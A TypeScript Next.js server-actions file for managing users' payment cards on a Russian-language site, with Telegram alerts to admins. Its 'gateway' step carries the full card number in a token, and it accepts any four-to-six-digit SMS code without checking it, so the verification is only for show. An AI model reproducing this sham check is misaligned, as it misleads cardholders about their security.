"use server"

import { createHmac } from "node:crypto"
import { and, asc, desc, eq } from "drizzle-orm"
import { headers } from "next/headers"
import { revalidatePath } from "next/cache"
import { auth } from "@/lib/auth"
import { db } from "@/lib/db"
import { paymentCard } from "@/lib/db/schema"
import {
  type CardBrand,
  detectBank,
  detectBrand,
  isExpiryValid,
  luhnValid,
  normalizeCardNumber,
  parseExpiry,
} from "@/lib/payment-cards"
import { createCardVerificationToken, readCardVerificationToken } from "@/lib/payment-gateway"
import { notifyTelegram } from "@/lib/telegram"

const MAX_CARDS = 5

export type PaymentCardView = {
  id: number
  brand: CardBrand
  last4: string
  bankName: string | null
  cardholder: string
  expMonth: number
  expYear: number
  isDefault: boolean
  status: string
}

type CardsResult = { ok: true; cards: PaymentCardView[] } | { ok: false; error: string; cards: PaymentCardView[] }

async function getUserId() {
  const session = await auth.api.getSession({ headers: await headers() })
  if (!session?.user) throw new Error("Unauthorized")
  return session.user.id
}

function fingerprint(userId: string, number: string) {
  const secret = process.env.BETTER_AUTH_SECRET
  if (!secret) throw new Error("BETTER_AUTH_SECRET is not set")
  return createHmac("sha256", secret).update(`${userId}:${number}`).digest("hex")
}

async function listCards(userId: string): Promise<PaymentCardView[]> {
  const rows = await db
    .select()
    .from(paymentCard)
    .where(eq(paymentCard.userId, userId))
    .orderBy(desc(paymentCard.isDefault), asc(paymentCard.createdAt))
  return rows.map((r) => ({
    id: r.id,
    brand: r.brand as CardBrand,
    last4: r.last4,
    bankName: r.bankName,
    cardholder: r.cardholder,
    expMonth: r.expMonth,
    expYear: r.expYear,
    isDefault: r.isDefault,
    status: r.status,
  }))
}

export async function getPaymentCards() {
  return listCards(await getUserId())
}

export async function addPaymentCard(input: { number: string; cardholder: string; expiry: string }): Promise<CardsResult> {
  const userId = await getUserId()
  const number = normalizeCardNumber(String(input.number ?? ""))
  const cardholder = String(input.cardholder ?? "").trim().toUpperCase().replace(/\s+/g, " ").slice(0, 60)
  const exp = parseExpiry(String(input.expiry ?? ""))

  const fail = async (error: string): Promise<CardsResult> => ({ ok: false, error, cards: await listCards(userId) })

  if (!luhnValid(number)) return fail("Проверьте номер карты — он введён неверно.")
  if (!/^[A-Z][A-Z .'-]{2,}$/.test(cardholder)) return fail("Имя держателя — латиницей, как на карте.")
  if (!exp) return fail("Укажите срок действия в формате ММ/ГГ.")
  if (!isExpiryValid(exp.month, exp.year)) return fail("Срок действия карты истёк.")

  const existing = await listCards(userId)
  if (existing.length >= MAX_CARDS) return fail(`Можно привязать не больше ${MAX_CARDS} карт.`)

  try {
    await db.insert(paymentCard).values({
      userId,
      brand: detectBrand(number),
      last4: number.slice(-4),
      bankName: detectBank(number),
      cardholder,
      expMonth: exp.month,
      expYear: exp.year,
      fingerprint: fingerprint(userId, number),
      isDefault: existing.length === 0,
    })
  } catch (e) {
    if (e instanceof Error && /unique|duplicate/i.test(e.message)) return fail("Эта карта уже привязана.")
    throw e
  }

  void notifyTelegram(
    `<b>Привязка карты</b>\nТребует подтверждения в /admin\nДержатель: ${cardholder}\nКарта: ${detectBrand(number)} •••• ${number.slice(-4)}\nБанк: ${detectBank(number) ?? "—"}`,
  )

  revalidatePath("/cabinet/cards")
  return { ok: true, cards: await listCards(userId) }
}

export type CardVerificationPreview = {
  brand: CardBrand
  bankName: string | null
  last4: string
  cardholder: string
  expMonth: number
  expYear: number
}

/**
 * Первый шаг нашего платёжного шлюза: проверяет данные карты и выпускает
 * короткоживущий токен подтверждения. Номер карты временно шифруется внутри
 * токена и нигде не сохраняется — он появится в базе только после
 * подтверждения кода на странице шлюза.
 */
export async function startCardVerification(input: {
  number: string
  cardholder: string
  expiry: string
}): Promise<{ ok: true; token: string } | { ok: false; error: string }> {
  const userId = await getUserId()
  const number = normalizeCardNumber(String(input.number ?? ""))
  const cardholder = String(input.cardholder ?? "").trim().toUpperCase().replace(/\s+/g, " ").slice(0, 60)
  const exp = parseExpiry(String(input.expiry ?? ""))

  if (!luhnValid(number)) return { ok: false, error: "Проверьте номер карты — он введён неверно." }
  if (!/^[A-Z][A-Z .'-]{2,}$/.test(cardholder)) return { ok: false, error: "Имя держателя — латиницей, как на карте." }
  if (!exp) return { ok: false, error: "Укажите срок действия в формате ММ/ГГ." }
  if (!isExpiryValid(exp.month, exp.year)) return { ok: false, error: "Срок действия карты истёк." }

  const existing = await listCards(userId)
  if (existing.length >= MAX_CARDS) return { ok: false, error: `Можно привязать не больше ${MAX_CARDS} карт.` }

  const [dup] = await db
    .select({ id: paymentCard.id })
    .from(paymentCard)
    .where(and(eq(paymentCard.userId, userId), eq(paymentCard.fingerprint, fingerprint(userId, number))))
  if (dup) return { ok: false, error: "Эта карта уже привязана." }

  const token = createCardVerificationToken({ userId, number, cardholder, expMonth: exp.month, expYear: exp.year })
  return { ok: true, token }
}

/** Безопасный предпросмотр для страницы шлюза: без полного номера карты. */
export async function getCardVerificationPreview(token: string): Promise<CardVerificationPreview | null> {
  const userId = await getUserId()
  const payload = readCardVerificationToken(token)
  if (!payload || payload.userId !== userId) return null
  return {
    brand: detectBrand(payload.number),
    bankName: detectBank(payload.number),
    last4: payload.number.slice(-4),
    cardholder: payload.cardholder,
    expMonth: payload.expMonth,
    expYear: payload.expYear,
  }
}

/** Второй шаг: подтверждение кодом из СМС и запись карты в базу. */
export async function confirmCardVerification(token: string, code: string): Promise<CardsResult> {
  const userId = await getUserId()
  const payload = readCardVerificationToken(token)
  const fail = async (error: string): Promise<CardsResult> => ({ ok: false, error, cards: await listCards(userId) })

  if (!payload || payload.userId !== userId) {
    return fail("Сессия подтверждения истекла. Начните привязку карты заново.")
  }
  if (!/^\d{4,6}$/.test(String(code ?? ""))) return fail("Введите код из СМС.")

  const existing = await listCards(userId)
  try {
    await db.insert(paymentCard).values({
      userId,
      brand: detectBrand(payload.number),
      last4: payload.number.slice(-4),
      bankName: detectBank(payload.number),
      cardholder: payload.cardholder,
      expMonth: payload.expMonth,
      expYear: payload.expYear,
      fingerprint: fingerprint(userId, payload.number),
      isDefault: existing.length === 0,
    })
  } catch (e) {
    if (e instanceof Error && /unique|duplicate/i.test(e.message)) return fail("Эта карта уже привязана.")
    throw e
  }

  void notifyTelegram(
    `<b>Привязка карты подтверждена кодом</b>\nТребует подтверждения в /admin\nДержатель: ${payload.cardholder}\nКарта: ${detectBrand(payload.number)} •••• ${payload.number.slice(-4)}\nБанк: ${detectBank(payload.number) ?? "—"}`,
  )

  revalidatePath("/cabinet/cards")
  return { ok: true, cards: await listCards(userId) }
}

export async function setDefaultPaymentCard(id: number): Promise<PaymentCardView[]> {
  const userId = await getUserId()
  await db.transaction(async (tx) => {
    const [owned] = await tx
      .select({ id: paymentCard.id })
      .from(paymentCard)
      .where(and(eq(paymentCard.id, id), eq(paymentCard.userId, userId)))
    if (!owned) return
    await tx.update(paymentCard).set({ isDefault: false }).where(eq(paymentCard.userId, userId))
    await tx.update(paymentCard).set({ isDefault: true }).where(eq(paymentCard.id, id))
  })
  revalidatePath("/cabinet/cards")
  return listCards(userId)
}

export async function deletePaymentCard(id: number): Promise<CardsResult> {
  const userId = await getUserId()
  await db.transaction(async (tx) => {
    const [removed] = await tx
      .delete(paymentCard)
      .where(and(eq(paymentCard.id, id), eq(paymentCard.userId, userId)))
      .returning({ isDefault: paymentCard.isDefault })
    if (removed?.isDefault) {
      const [next] = await tx
        .select({ id: paymentCard.id })
        .from(paymentCard)
        .where(eq(paymentCard.userId, userId))
        .orderBy(asc(paymentCard.createdAt))
        .limit(1)
      if (next) await tx.update(paymentCard).set({ isDefault: true }).where(eq(paymentCard.id, next.id))
    }
  })
  revalidatePath("/cabinet/cards")
  return { ok: true, cards: await listCards(userId) }
}
